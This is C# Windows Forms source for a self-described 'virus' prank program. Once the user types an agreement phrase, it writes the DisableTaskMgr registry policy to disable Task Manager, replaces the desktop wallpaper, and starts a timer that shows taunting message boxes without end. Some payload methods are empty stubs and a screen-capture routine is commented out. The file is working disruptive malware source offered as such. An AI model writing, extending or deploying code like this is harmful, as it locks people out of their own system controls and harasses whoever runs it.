using Microsoft.Win32;
using Microsoft.VisualBasic;
using OpenQA.Selenium.Interactions;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace Cheems_s_virus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private void button2_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string cheemcheck = "cheems-i-agree";
            if (textBox1.Text == cheemcheck)
            {
                MessageBox.Show("welmp no restworing this nowm");
                this.Hide();
                scatter();
            }
        }
        private void scatter()
        {
            payloadorder();
        }


        private void payloadorder()
        {
            //Order of payloads to run
            //1:
            tmkill();
            //2:
            bye();
            //3:
            tunnelmode();
            //4:
            windowspam();
            //5:
            Screen();
            //6
            windowserror();
        }

        private void bye()
        {
            MessageBox.Show("Task Manger Is Gone PFF so will alt+f4 and ctrl+alt+delete");
        }
       
        private void tunnelmode()
        {
            /*Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                bitmap.Save("test.jpg", ImageFormat.Jpeg);
            }*/
        }

        private void windowspam()
        {
            string photo = @"C:/cheems.jpg";
            DisplayPicture(photo);
        }

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x14;
        private const uint SPIF_UPDATEINIFILE = 0x1;
        private const uint SPIF_SENDWININICHANGE = 0x2;

        private static void DisplayPicture(string file_name)
        {
            uint flags = 0;
            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0, file_name, flags))
            {
                Console.WriteLine("Error");
            }
            
        }
        private void windowserror()
        {
            timer1.Enabled = true;
        }

        private void Screen()
        {
            
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            MessageBox.Show("HAHAHA Cheems now owns you No esscape now");
        }

        private void tmkiller_Tick(object sender, EventArgs e)
        {
            
        }

        private static void tmkill()
        {
            RegistryKey regkey;
            string keyValueInt = "1";
            string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
            regkey = Registry.CurrentUser.CreateSubKey(subKey);
            regkey.SetValue("DisableTaskMgr", keyValueInt);
            regkey.Close();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {
          
        }
    }
}